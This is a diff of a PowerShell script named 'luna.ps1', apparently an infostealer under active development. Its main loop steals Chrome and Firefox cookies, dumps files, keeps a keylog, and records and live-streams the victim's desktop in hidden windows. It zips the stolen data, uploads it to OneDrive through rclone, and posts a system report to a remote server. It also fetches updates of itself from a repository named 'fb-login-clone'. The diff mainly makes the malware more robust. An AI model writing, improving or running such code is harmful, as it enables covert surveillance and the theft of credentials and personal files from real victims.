@@ -130,50 +130,64 @@ function Start-Recording {
 
     if ($Mode -eq "record") {
         $output = "$tempDir\screen_capture.mp4"
-        & "$ffmpeg" -y -f gdigrab -framerate 15 -i desktop -t 00:01:00 -vcodec libx264 "$output"
+        $proc = Start-Process -WindowStyle Hidden -FilePath $ffmpeg `
+            -ArgumentList "-y -f gdigrab -framerate 15 -i desktop -t 00:01:00 -vcodec libx264 `"$output`"" -PassThru
+        $proc.WaitForExit()
     } elseif ($Mode -eq "stream") {
-        Start-Process -WindowStyle Hidden -FilePath $ffmpeg `
-            -ArgumentList "-f gdigrab -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/wqrj-k80s-cwwq-7wct-3rc8"
+        Start-Process -FilePath $ffmpeg `
+            -ArgumentList "-f gdigrab -framerate 15 -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/YOURKEY" `
+            -RedirectStandardOutput "$tempDir\stream.log" `
+            -RedirectStandardError "$tempDir\stream_error.log" `
+            -WindowStyle Hidden
     }
 }
-
 function Archive-And-Upload {
     if (-not (Test-Path $keylogPath)) {
-    "" | Out-File -Encoding utf8 -Force $keylogPath
+        "" | Out-File -Encoding utf8 -Force $keylogPath
     }
     if (-not (Test-Path $keylogPath)) {
-    New-Item -ItemType File -Path $keylogPath -Force | Out-Null
+        New-Item -ItemType File -Path $keylogPath -Force | Out-Null
     }
+
     try {
         $report = Get-SystemReport
-        if ($report) {
-            $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Force
+        if (-not $report) {
+            Write-Warning "Report is null, skipping Telegram"
+            return
         }
+    try {
+        $report | ConvertTo-Json -Depth 5 | Out-File $logPath -Force -Encoding utf8
+    } catch {
+        Write-Warning "ConvertTo-Json failed: $_"
+    }
 
         $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
         $user = $env:USERNAME
-        $finalZip = "$tempDir\luna_$user" + "_$timestamp.zip"
+        $finalZip = "$tempDir\luna_${user}_$timestamp.zip"
         $meta = "$tempDir\info.txt"
+
+        $filesCount = (Get-ChildItem "$fileDumpDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
+        $cookieCount = (Get-ChildItem "$cookieDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
 
         @"
 System: $($report.user)@$($report.host)
 Date: $timestamp
-Files: $(Get-ChildItem "$fileDumpDir" -Recurse | Measure-Object).Count
-Cookies: $(Get-ChildItem "$cookieDir" -Recurse | Measure-Object).Count
+Files: $filesCount
+Cookies: $cookieCount
 "@ | Set-Content -Path $meta
-        $filesCount = (Get-ChildItem "$fileDumpDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
-        $cookieCount = (Get-ChildItem "$cookieDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
-        $video = "$tempDir\screen_capture.mp4"
+
         $paths = @($logPath, $meta, "$cookieDir\*", "$fileDumpDir\*", $keylogPath)
-        if (Test-Path $video) { $paths += $video }
+        if (Test-Path "$tempDir\screen_capture.mp4") {
+            $paths += "$tempDir\screen_capture.mp4"
+        }
+
         Start-Sleep -Seconds 2
         Compress-Archive -Path $paths -DestinationPath $finalZip -Force
 
         Upload-To-OneDrive -ZipPath $finalZip -UserName $user -Timestamp $timestamp
-        $summary = "Files: $filesCount, Cookies: $cookieCount"
         Send-Telegram -Report $report -FilesCount $filesCount -CookiesCount $cookieCount
     } catch {
-        Write-Warning "Archiving or upload failed: $_"
+        Write-Warning "Report empty, telegram skipped: $_"
     }
 }
 
@@ -196,8 +210,9 @@ function Upload-To-OneDrive {
     & "$rcloneExe" copy "$ZipPath" "$remoteFolder" --config "$rcloneConf" --create-empty-src-dirs --quiet
 
     if ($LASTEXITCODE -eq 0) {
-        $link = "https://onedrive.live.com/?id=root&cid=9f1831722b7187c6"
-        $summary = "Files: $filesCount, Cookies: $cookieCount"
+        Write-Output "Upload successful"
+    } else {
+        Write-Warning "rclone upload failed with code $LASTEXITCODE"
     }
 }
 function Send-Telegram {
@@ -207,39 +222,28 @@ function Send-Telegram {
         [string]$CookiesCount
     )
 
-    $text = @"
- PowerShell Identity Report
-
- User: $($Report.user)
- Machine: $($Report.host)
- OS: $($Report.os) $($Report.version)
- Arch: $($Report.arch)
- CPU: $($Report.cpu)
- Time: $($Report.timestamp)
-
- Files: $FilesCount
- Cookies: $CookiesCount
-
-"@
-
-    try {
-        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST `
-            -Body (@{ text = $text } | ConvertTo-Json -Compress) `
-            -ContentType "application/json"
-    } catch {
-        Write-Warning "Telegram send failed: $_"
+    if (-not $Report) {
+        Write-Warning "No report data to send"
+        return
     }
-}
-Upload complete:
-User: $User
-Time: $Timestamp
 
-$Summary
+    $text = @"
+PowerShell Identity Report
+----------------------
+User: $($Report.user)
+Machine: $($Report.host)
+OS: $($Report.os) $($Report.version)
+Arch: $($Report.arch)
+CPU: $($Report.cpu)
+Time: $($Report.timestamp)
+
+Files: $FilesCount
+Cookies: $CookiesCount
+----------------------
 "@
+
     try {
-        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST `
-            -Body (@{ text = $text } | ConvertTo-Json -Compress) `
-            -ContentType "application/json"
+        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $text } | ConvertTo-Json -Compress) -ContentType "application/json"
     } catch {
         Write-Warning "Telegram send failed: $_"
     }
@@ -255,32 +259,37 @@ function Cleanup {
 }
 
 # === MAIN LOOP ===
-
 while ($true) {
     Get-ChromeCookies
     Get-FirefoxCookies
     Scan-Files
+
     if (-not (Test-Path $fileDumpDir)) {
         New-Item -ItemType Directory -Path $fileDumpDir -Force | Out-Null
     }
+
     Start-Recording -Mode "record"
     Start-Recording -Mode "stream"
+
     Archive-And-Upload
     Cleanup
+
     function Self-Update {
-    $url = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna/luna.ps1"
-    $local = "$PSScriptRoot\luna.ps1"
-    try {
-        Invoke-WebRequest -Uri $url -OutFile $local -UseBasicParsing
-        Write-Output "Self-update complete"
-    } catch {
-        Write-Warning "Self-update failed"
+        $url = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna/luna.ps1"
+        $local = "$PSScriptRoot\luna.ps1"
+        try {
+            Invoke-WebRequest -Uri $url -OutFile $local -UseBasicParsing
+            Write-Output "Self-update complete"
+        } catch {
+            Write-Warning "Self-update failed"
+        }
     }
-    }
+
     Self-Update
     Write-Output "Restarting after update..."
     Start-Process -FilePath "$local" -WindowStyle Hidden
     exit
-    }
+}
+
 
 Stop-Transcript
